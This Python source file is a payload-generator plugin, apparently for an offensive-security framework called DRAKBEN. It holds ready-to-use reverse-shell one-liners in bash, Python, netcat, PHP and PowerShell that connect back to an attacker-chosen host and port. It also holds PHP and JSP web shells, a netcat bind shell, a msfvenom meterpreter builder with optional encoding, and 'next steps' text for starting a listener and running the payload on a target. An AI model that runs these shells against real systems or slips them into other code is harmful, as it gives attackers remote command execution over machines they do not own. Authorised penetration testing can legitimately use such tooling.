# core/plugins/adapters/payload_plugin.py
# DRAKBEN Payload Generator Plugin

import base64
import asyncio
from typing import Dict, List, Optional
from ..base import PayloadPlugin, PluginSpec, PluginResult, PluginKind


class MsfPayloadPlugin(PayloadPlugin):
    """
    Metasploit msfvenom ile payload üretimi
    """
    
    def __init__(self, spec: PluginSpec = None):
        if spec is None:
            spec = PluginSpec(
                plugin_id="payload.msfvenom",
                kind=PluginKind.PAYLOAD,
                name="MSFVenom Payload Generator",
                version="1.0.0",
                description="Generate payloads with Metasploit msfvenom",
                capabilities=["reverse_shell", "bind_shell", "meterpreter", "web_shell"],
                requires_approval=True,
                timeout=120
            )
        super().__init__(spec)
        self._msfvenom_available = None
        
        # Payload templates (no msfvenom required)
        self._templates = {
            "reverse_shell_bash": [
                "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            ],
            "reverse_shell_python": [
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            ],
            "reverse_shell_nc": [
                "nc -e /bin/sh {lhost} {lport}",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            ],
            "reverse_shell_php": [
                "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            ],
            "reverse_shell_powershell": [
                "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            ],
            "web_shell_php": [
                "<?php system($_GET['cmd']); ?>",
                "<?php echo shell_exec($_GET['cmd']); ?>",
                "<?php if(isset($_REQUEST['cmd'])){{ echo shell_exec($_REQUEST['cmd']); }} ?>",
            ],
            "web_shell_jsp": [
                '<%@ page import="java.io.*" %><%String cmd = request.getParameter("cmd");Process p = Runtime.getRuntime().exec(cmd);%>',
            ],
            "bind_shell_nc": [
                "nc -lvnp {lport} -e /bin/bash",
            ],
        }
    
    async def initialize(self) -> bool:
        """Check if msfvenom is available"""
        self._msfvenom_available = await self._check_msfvenom()
        self.initialized = True
        return True  # Templates always available
    
    async def _check_msfvenom(self) -> bool:
        """Check if msfvenom is installed"""
        try:
            proc = await asyncio.create_subprocess_exec(
                "msfvenom", "--help",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            _, _ = await proc.communicate()
            return proc.returncode == 0
        except FileNotFoundError:
            return False
    
    async def _generate_payload(self, payload_type: str, lhost: str, lport: int, **kwargs) -> PluginResult:
        """Generate payload"""
        
        # Format parameter
        output_format = kwargs.get("format", "raw")
        encoder = kwargs.get("encoder")
        platform = kwargs.get("platform", "linux")
        
        # Check if we can use msfvenom
        if self._msfvenom_available and payload_type.startswith("meterpreter"):
            return await self._generate_msfvenom_payload(payload_type, lhost, lport, output_format, encoder, platform)
        
        # Use templates
        return self._generate_template_payload(payload_type, lhost, lport, **kwargs)
    
    async def _generate_msfvenom_payload(self, payload_type: str, lhost: str, lport: int,
                                          output_format: str, encoder: str, platform: str) -> PluginResult:
        """Generate payload using msfvenom"""
        
        # Build payload name
        if platform == "linux":
            payload = f"linux/x64/meterpreter/reverse_tcp"
        elif platform == "windows":
            payload = f"windows/x64/meterpreter/reverse_tcp"
        else:
            payload = "linux/x64/shell_reverse_tcp"
        
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output_format}"
        
        if encoder:
            cmd += f" -e {encoder}"
        
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=self.spec.timeout
            )
            
            if proc.returncode != 0:
                return PluginResult(
                    success=False,
                    errors=[stderr.decode('utf-8', errors='ignore')]
                )
            
            output = stdout.decode('utf-8', errors='ignore')
            
            return PluginResult(
                success=True,
                data={
                    "payload_type": payload_type,
                    "payload": payload,
                    "lhost": lhost,
                    "lport": lport,
                    "format": output_format,
                    "content": output,
                    "generator": "msfvenom"
                },
                output=output,
                next_steps=[
                    f"Listener başlat: nc -lvnp {lport}",
                    "Payload'ı hedefe transfer et",
                    "Payload'ı çalıştır"
                ]
            )
            
        except Exception as e:
            return PluginResult(
                success=False,
                errors=[str(e)]
            )
    
    def _generate_template_payload(self, payload_type: str, lhost: str, lport: int, **kwargs) -> PluginResult:
        """Generate payload from templates"""
        
        # Find matching template
        templates = self._templates.get(payload_type, [])
        
        if not templates:
            # Try partial match
            for key, tmpl_list in self._templates.items():
                if payload_type in key or key in payload_type:
                    templates = tmpl_list
                    break
        
        if not templates:
            return PluginResult(
                success=False,
                errors=[f"Unknown payload type: {payload_type}"],
                data={"available_types": list(self._templates.keys())}
            )
        
        # Generate payloads
        payloads = []
        for template in templates:
            payload = template.format(lhost=lhost, lport=lport)
            payloads.append(payload)
        
        # Encode if requested
        encoding = kwargs.get("encoding")
        encoded_payloads = []
        
        if encoding == "base64":
            for p in payloads:
                encoded_payloads.append(base64.b64encode(p.encode()).decode())
        
        return PluginResult(
            success=True,
            data={
                "payload_type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "payloads": payloads,
                "encoded_payloads": encoded_payloads if encoded_payloads else None,
                "generator": "template"
            },
            output=payloads[0],
            next_steps=[
                f"Listener başlat: nc -lvnp {lport}",
                "Payload'ı hedefe çalıştır"
            ]
        )
    
    def list_available_payloads(self) -> List[str]:
        """List available payload types"""
        return list(self._templates.keys())


# Quick reverse shell generator
async def reverse_shell(lhost: str, lport: int = 4444, shell_type: str = "bash") -> PluginResult:
    """Quick reverse shell generator"""
    plugin = MsfPayloadPlugin()
    await plugin.initialize()
    return await plugin.execute(payload_type=f"reverse_shell_{shell_type}", lhost=lhost, lport=lport)


# Quick web shell generator
async def web_shell(shell_type: str = "php") -> PluginResult:
    """Quick web shell generator"""
    plugin = MsfPayloadPlugin()
    await plugin.initialize()
    return await plugin.execute(payload_type=f"web_shell_{shell_type}", lhost="", lport=0)
